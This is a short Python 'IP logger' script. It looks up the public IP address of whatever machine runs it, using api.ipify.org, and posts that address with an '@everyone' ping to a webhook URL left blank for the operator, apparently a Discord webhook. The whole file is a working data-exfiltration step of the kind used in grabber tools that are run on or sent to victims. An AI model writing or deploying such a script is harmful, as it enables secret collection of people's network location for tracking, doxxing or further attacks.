import requests


#Webhook Here
webhook = ""

#Ip Logger
url = "https://api.ipify.org"
r = requests.get(url).text
r = str(r)

#Send Ip To Webhook
requests.post(webhook, json={"content": f"@everyone Ip: {r}"})
